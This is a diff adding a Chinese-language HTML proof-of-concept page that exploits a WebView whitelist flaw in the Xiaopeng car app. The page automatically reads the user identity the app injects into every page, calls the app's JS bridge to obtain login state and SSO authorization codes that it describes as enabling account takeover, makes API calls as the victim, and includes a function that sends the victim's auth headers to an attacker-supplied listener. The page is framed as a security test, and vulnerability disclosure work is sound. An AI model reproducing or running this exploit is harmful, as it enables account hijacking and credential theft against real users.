@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>页面加载中…</title>
+<style>
+  body{font-family:-apple-system,sans-serif;background:#0d1117;color:#e6edf3;margin:0;padding:16px;font-size:14px}
+  h3{color:#ff6b6b;margin:8px 0 12px;font-size:16px}
+  .card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px;margin-bottom:10px}
+  .card h4{margin:0 0 8px;font-size:14px;color:#58a6ff}
+  pre{background:#0a0e14;border-radius:6px;padding:8px;white-space:pre-wrap;word-break:break-all;font-size:12px;max-height:220px;overflow:auto;margin:0;color:#7ee787}
+  button{background:#238636;color:#fff;border:none;border-radius:6px;padding:8px 14px;font-size:14px;margin:4px 4px 0 0}
+  button.alt{background:#1f6feb}
+  .tag{display:inline-block;background:#da3633;color:#fff;border-radius:4px;padding:1px 6px;font-size:11px;margin-left:6px}
+  .ok{color:#7ee787}.fail{color:#ff7b72}.dim{color:#8b949e}
+  #origin{color:#ffa657;word-break:break-all}
+</style>
+</head>
+<body>
+<h3>⚠️ 安全测试页 — 小鹏汽车App（国内版）WebView 越权演示（只读）</h3>
+<div class="card">
+  <h4>当前页面真实来源</h4>
+  <pre id="origin">…</pre>
+  <div class="dim" style="margin-top:6px">本页面运行在<b>小鹏国内版APP</b>（com.xiaopeng.mycarinfo）内嵌WebView中，
+  但域名完全受攻击者控制（github.io，与 xiaopeng.com 无关）。<br>
+  通过 DeepLink <code>xiaopeng://www.xiaopeng.com/common/webview?url=…</code> 打开，
+  路径中包含 <code>/x.xiaopeng.com/</code> 目录段即通过白名单校验（按完整URL字符串正则匹配缺陷）。</div>
+</div>
+
+<div class="card"><h4>① 自动注入身份对象读取 <span class="tag">__xp_info__（零调用·自动泄露）</span></h4>
+  <button onclick="readXpInfo()">读取注入的身份</button>
+  <pre id="r0">（onPageStarted 无差别向所有页面注入 uid/昵称/头像/登录态——无需任何桥调用）</pre></div>
+
+<div class="card"><h4>② 桥方法探测 <span class="tag">_dsbridge</span></h4>
+  <button onclick="run('getLoginState',{},'r1')">getLoginState</button>
+  <button onclick="run('getCarInfo',{},'r2')">getCarInfo</button>
+  <button onclick="run('getVehicles',{},'r2b')">getVehicles</button>
+  <pre id="r1"></pre>
+  <pre id="r2"></pre>
+  <pre id="r2b"></pre>
+  <div class="dim">（当前容器未挂 CallNativeModule 时返回 Method not found；挂在完整桥的容器中即返回数据）</div></div>
+
+<div class="card"><h4>③ SSO 授权码签发探测 <span class="tag">getAuthCode → 账户接管</span></h4>
+  <button onclick="run('getAuthCode',{target:'xp_car_owner_service'},'r3')">签发授权码(车主服务)</button>
+  <button class="alt" onclick="run('getAuthCode',{target:'xp_digitalservice_insurance'},'r3b')">签发授权码(保险H5)</button>
+  <pre id="r3">（成功 = code:1 + data.code，30秒内可换90天登录会话 = 账户接管）</pre>
+  <pre id="r3b"></pre></div>
+
+<div class="card"><h4>④ 以受害者身份代发APP API <span class="tag">request</span></h4>
+  <button onclick="run('request',{url:'/biz/v5/user/config/get',options:{method:'GET'}},'r4')">代发只读API（本号配置）</button>
+  <pre id="r4">（原生APP凭证 mTLS+TEE+XP三层签名 全套由APP自动附加）</pre></div>
+
+<div class="card"><h4>⑤ 凭证外带验证（可选）<span class="tag">request → 攻击者服务器</span></h4>
+  <div class="dim" style="margin-bottom:6px">把下面的地址换成你自己的监听端点（如 Burp Collaborator），
+  点按钮后该端点收到的请求头将包含受害者完整的 xp-authorization / xp-signature / xp-tee-id。</div>
+  <input id="exfilUrl" placeholder="https://你的监听地址/steal" style="width:95%;padding:6px;margin:4px 0;background:#0a0e14;color:#e6edf3;border:1px solid #30363d;border-radius:6px">
+  <button onclick="doExfil()">让APP把凭证发到该地址</button>
+  <pre id="r5">（默认不发送；填写地址后点击）</pre></div>
+
+<script>
+// ============ 双协议桥调用（stub式 + 三参数式自动兼容） ============
+function bridgeCall(method, args, cb, timeoutMs){
+  var done = false;
+  function fin(res){ if(!done){ done = true; try{ cb && cb(res); }catch(e){} } }
+  var stub = '_cb_' + Math.random().toString(36).slice(2);
+  window[stub] = function(res){ delete window[stub]; fin(res); };
+  setTimeout(function(){ if(window[stub]){ delete window[stub]; fin({__timeout:true}); } }, timeoutMs || 8000);
+  try {
+    // 姿势A: dsbridge JSON协议（payload + _dscbstub）
+    window._dsbridge.call(method, JSON.stringify({ data: (args || {}), _dscbstub: stub }));
+  } catch(eA) {
+    try {
+      // 姿势B: 三参数式
+      window._dsbridge.call(method, args || {}, function(res){ fin(res); });
+    } catch(eB) { fin({__error: String(eB)}); }
+  }
+}
+function show(id, obj){
+  var el = document.getElementById(id);
+  el.textContent = typeof obj === 'string' ? obj : JSON.stringify(obj, null, 1);
+}
+function run(method, args, resultId){
+  show(resultId, '调用中…');
+  bridgeCall(method, args, function(res){
+    var hit = res && !res.__timeout && !res.__error;
+    show(resultId, (hit ? '' : (res.__timeout ? '⏱ 超时(无响应)\n' : '✗ ' + (res.__error || 'Method not found / 拒绝') + '\n')) + JSON.stringify(res, null, 1));
+    if (hit && el_ok(method, res)) {
+      var el = document.getElementById(resultId);
+      el.innerHTML = '<span class="ok">✔ 成功：</span>' + el.innerHTML;
+    }
+  });
+}
+function el_ok(method, res){
+  if (method === 'getLoginState') return res.loginState === 1 || res.userInfo;
+  if (method === 'getAuthCode') return res.code === 1 || res.code === 200;
+  if (method === 'request') return res.code === 2000 || res.code === 200;
+  if (method === 'getCarInfo' || method === 'getVehicles') return !!res.data;
+  return false;
+}
+// ① __xp_info__（国内版实锤：自动注入，无需桥）
+function readXpInfo(){
+  var xi = window.__xp_info__;
+  if (xi) {
+    show('r0', JSON.stringify(xi, null, 1));
+    var el = document.getElementById('r0');
+    el.innerHTML = '<span class="ok">✔ 泄露成功（零调用）：</span>' + el.innerHTML;
+  } else {
+    show('r0', '__xp_info__ 不存在（该容器未注入或时机未到）');
+  }
+}
+// ⑤ 凭证外带
+function doExfil(){
+  var u = document.getElementById('exfilUrl').value.trim();
+  if(!u){ show('r5','请先填写你的监听地址'); return; }
+  show('r5','已让APP向该地址发起请求，请检查你的监听端收到的请求头…');
+  bridgeCall('request', {url: u, options:{method:'GET'}}, function(res){
+    show('r5', 'APP请求已发出并返回: ' + JSON.stringify(res) + '\n→ 现在去看你监听端收到的 XP-* 请求头');
+  });
+}
+
+// ============ 启动 ============
+document.getElementById('origin').textContent =
+  'location.origin = ' + location.origin + '\n(这是攻击者域名 github.io，不是 xiaopeng.com)';
+if (typeof window._dsbridge === 'undefined' && typeof window.__xp_info__ === 'undefined') {
+  document.body.insertAdjacentHTML('afterbegin',
+    '<div class="card"><span class="fail">未检测到 _dsbridge / __xp_info__ —— 请用 launch-cn.html 生成的链接在<b>小鹏国内版APP</b>内打开（不要用系统浏览器）。</span></div>');
+}
+// 自动演示 ①（零交互泄露）
+setTimeout(function(){ readXpInfo(); }, 1200);
+setTimeout(function(){ run('getLoginState',{},'r1'); }, 2500);
+setTimeout(function(){ run('getAuthCode',{target:'xp_car_owner_service'},'r3'); }, 4000);
+</script>
+</body>
+</html>
